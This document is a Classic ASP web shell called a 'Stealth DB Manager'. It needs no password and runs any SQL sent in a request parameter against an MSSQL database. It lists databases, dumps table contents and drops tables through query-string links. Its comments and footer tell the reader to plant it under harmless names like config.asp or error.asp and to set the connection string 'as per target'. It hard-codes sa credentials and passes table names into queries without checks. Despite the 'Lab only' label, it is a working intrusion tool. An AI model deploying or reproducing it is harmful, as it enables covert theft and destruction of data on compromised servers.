<%@ Language=VBScript %>
<%
' Classic ASP Stealth DB Manager (Lab only - MSSQL focused)
' Stealth: No password, normal filename rakh (config.asp, inc/db.asp etc.)
' Change connection string below as per target

Dim ConnStr
ConnStr = "Provider=SQLOLEDB;Data Source=127.0.0.1;Initial Catalog=HRSuiteHC;User ID=sa;Password=HRPass123;"  
' Examples:
' MSSQL local sa:   Provider=SQLOLEDB;Data Source=.;Initial Catalog=master;User ID=sa;Password=pass;
' Trusted:          Provider=SQLOLEDB;Data Source=.;Initial Catalog=master;Integrated Security=SSPI;
' MySQL (need MySQL ODBC driver): Driver={MySQL ODBC 8.0 Unicode Driver};Server=localhost;Database=test;User=root;Password=pass;Option=3;

Dim Conn, RS, SQL, DBAction, DBName, TableName, Query

Set Conn = Server.CreateObject("ADODB.Connection")
On Error Resume Next
Conn.Open ConnStr
If Err.Number <> 0 Then
    Response.Write "<font color='red'>Connection failed: " & Err.Description & "</font><br>"
    Response.End
End If
On Error Goto 0

DBAction   = Request("act")
DBName     = Request("db")
TableName  = Request("tbl")
Query      = Request("query")

' Header
%>
<html>
<head><title>DB Manager - Stealth</title></head>
<body style="font-family:consolas; background:#000; color:#0f0; margin:15px;">

<h2>Classic ASP Stealth DB Shell (MSSQL/MySQL/SQLite compatible)</h2>
<p>Connected to: <%=ConnStr%></p>

<!-- Change DB / Run Custom Query -->
<form method="get">
    Custom SQL: <input name="query" size="80" value="SELECT @@version"><br>
    <input type="submit" value="Run Query">
</form>

<h3>Databases / Catalogs</h3>
<%
If DBAction = "" Or DBAction = "listdbs" Then
    Set RS = Conn.Execute("SELECT name FROM sys.databases")  ' MSSQL
    ' MySQL: "SHOW DATABASES"
    ' SQLite: limited, use attached dbs or file path
    Do While Not RS.EOF
        Response.Write "<a href='?act=tables&db=" & Server.URLEncode(RS("name")) & "'>" & RS("name") & "</a><br>"
        RS.MoveNext
    Loop
    RS.Close
End If
%>

<% If DBAction = "tables" And DBName <> "" Then %>
    <h3>Tables in <%=Server.HTMLEncode(DBName)%></h3>
    <%
    Conn.Execute "USE " & DBName
    Set RS = Conn.Execute("SELECT name FROM sysobjects WHERE xtype='U' ORDER BY name")  ' MSSQL user tables
    ' MySQL: "SHOW TABLES"
    Do While Not RS.EOF
        Response.Write "<a href='?act=browse&db=" & Server.URLEncode(DBName) & "&tbl=" & Server.URLEncode(RS("name")) & "'>" & RS("name") & "</a> | "
        Response.Write "<a href='?act=drop&db=" & Server.URLEncode(DBName) & "&tbl=" & Server.URLEncode(RS("name")) & "' onclick='return confirm(""Drop table?"");' style='color:red;'>DROP</a><br>"
        RS.MoveNext
    Loop
    RS.Close
    %>
<% End If %>

<% If DBAction = "browse" And DBName <> "" And TableName <> "" Then %>
    <h3>Browsing <%=Server.HTMLEncode(TableName)%> in <%=Server.HTMLEncode(DBName)%></h3>
    <%
    Conn.Execute "USE " & DBName
    Set RS = Conn.Execute("SELECT TOP 100 * FROM " & TableName)  ' limit 100 rows
    If Not RS.EOF Then
        Response.Write "<table border='1' style='border-color:#0f0; color:#0f0; background:#111;'>"
        Response.Write "<tr>"
        For Each fld In RS.Fields
            Response.Write "<th>" & fld.Name & "</th>"
        Next
        Response.Write "</tr>"
        
        Do While Not RS.EOF
            Response.Write "<tr>"
            For Each fld In RS.Fields
                Response.Write "<td>" & Server.HTMLEncode(fld.Value & "") & "</td>"
            Next
            Response.Write "</tr>"
            RS.MoveNext
        Loop
        Response.Write "</table>"
    Else
        Response.Write "No rows or table empty."
    End If
    RS.Close
    %>
<% End If %>

<% If DBAction = "drop" And DBName <> "" And TableName <> "" Then %>
    <%
    Conn.Execute "USE " & DBName
    Conn.Execute "DROP TABLE " & TableName
    Response.Write "<font color='lime'>Table dropped: " & Server.HTMLEncode(TableName) & "</font>"
    %>
<% End If %>

<% If Query <> "" Then %>
    <h3>Query Result: <%=Server.HTMLEncode(Query)%></h3>
    <%
    Set RS = Conn.Execute(Query)
    If Not RS.EOF Then
        Response.Write "<table border='1' style='border-color:#0f0;'>"
        Response.Write "<tr>"
        For Each fld In RS.Fields
            Response.Write "<th>" & fld.Name & "</th>"
        Next
        Response.Write "</tr>"
        
        Do While Not RS.EOF And RS.AbsolutePosition < 200  ' limit rows
            Response.Write "<tr>"
            For Each fld In RS.Fields
                Response.Write "<td>" & Server.HTMLEncode(fld.Value & "") & "</td>"
            Next
            Response.Write "</tr>"
            RS.MoveNext
        Loop
        Response.Write "</table>"
    Else
        Response.Write "<font color='yellow'>Query executed (no result set - INSERT/UPDATE/DROP ok?)</font>"
    End If
    RS.Close
    %>
<% End If %>

<p style="color:#888;">Stealth tips: Rename to error.asp / config.asp / db_check.asp<br>
Add password later if needed: If Request("key") <> "secret" Then Response.End<br>
For MySQL/SQLite: Change ConnStr + queries (SHOW DATABASES, SHOW TABLES etc.)</p>

</body>
</html>

<%
If Not RS Is Nothing Then RS.Close
If Not Conn Is Nothing Then Conn.Close
Set RS = Nothing
Set Conn = Nothing
%>
